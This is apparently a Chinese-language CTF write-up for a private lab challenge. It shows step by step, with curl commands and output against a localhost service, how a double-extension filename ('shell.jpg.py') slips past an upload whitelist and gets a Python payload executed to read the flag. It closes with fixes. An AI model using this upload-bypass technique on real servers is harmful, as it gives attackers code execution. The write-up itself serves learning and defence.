---
title: range-v1 第 3 题：双后缀上传绕过，传上去就执行
date: 2026-11-28 11:07:52
author: Xendr1a
categories: [CTF题解, range-v1]
tags: [range-v1, 文件上传, Writeup]
description: 私人靶场链 range-v1 第 3 题：上传校验取首后缀、运行器按尾后缀 exec，shell.jpg.py 两边同时成立。
toc: true
---
## 环境

`python:3.12-slim`，零第三方依赖，容器内 8080，本地 `127.0.0.1:12003`。镜像里没有 FLAG，flag 走运行时注入。

漏洞一句话说完：上传校验取**第一个**后缀（白名单 jpg/jpeg/png/gif），插件运行器按**最后一个**后缀 `.py` 决定 `exec`。`shell.jpg.py` 在两边同时成立。

## 先摸边界

探活：

```console
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:12003/
200
```

`.py` 被拦：

```console
$ printf 'print("hi")\n' > /tmp/shell.py
$ curl -s -F 'file=@/tmp/shell.py' http://127.0.0.1:12003/upload
不允许的类型：.py
```

`.txt` 同样被拦：

```console
$ printf 'x' > /tmp/a.txt
$ curl -s -F 'file=@/tmp/a.txt' http://127.0.0.1:12003/upload
不允许的类型：.txt
```

合法图片能过：

```console
$ printf '\x89PNGfake' > /tmp/a.png
$ curl -s -F 'file=@/tmp/a.png' http://127.0.0.1:12003/upload
saved a.png
```

校验认 `png`，不认内容。

## 双后缀

把两个后缀拼上，首后缀骗过白名单，尾后缀触发执行：

```console
$ printf 'import os\nprint("FLAG=" + os.environ.get("FLAG",""))\n' > /tmp/shell.jpg.py
$ curl -s -F 'file=@/tmp/shell.jpg.py' http://127.0.0.1:12003/upload
saved shell.jpg.py
FLAG=flag{range_v1_r3-upload-bypass}
```

上传接口直接回了 flag——插件是"传完即跑"。

再走一遍手动执行，确认是文件真的被执行，不是接口顺手回显：

```console
$ curl -s http://127.0.0.1:12003/files
a.png
shell.jpg.py
$ curl -s 'http://127.0.0.1:12003/run?name=shell.jpg.py'
FLAG=flag{range_v1_r3-upload-bypass}
```

平台冒烟：

```console
$ toolkit test-challenge ~/ctf/challenges/range-v1/r3-upload-bypass | tail -2
✓ 端口 169xx 已连通（容器内 8080）
✓ 通过：起得来、端口通（未解题验证）
```

## 踩坑

**上传目录不能待在 `/app`。** 镜像里 `COPY src/ /app/` 之后切到 `USER ctf`，`/app` 归 root，第一次 `compose up` 直接 `PermissionError: '/app/uploads'`。把默认改成 `/tmp/uploads` 才起来。

**手写 multipart 解析有两个细节。** `boundary=...` 可能带引号；`part` 末尾的 `\r\n` 必须剥掉，不然写进去的 payload 尾部多两个字节。

**文件名做了 `safe_name()` 处理。** `/`、`..` 这类会被清掉，所以这题考的是扩展名，不是 traversal——想打路径穿越的可以收手了。

## 复盘

两个组件对"后缀"的理解不一致，白名单就是纸糊的。修法是上传端只认白名单里的**完整**后缀、服务端别拿用户文件名去决定执行方式，运行时按 MIME 或内容识别，且执行目录不可写。

顺带一句：这题的时间线里最耗时间的不是绕过，是容器起不来。
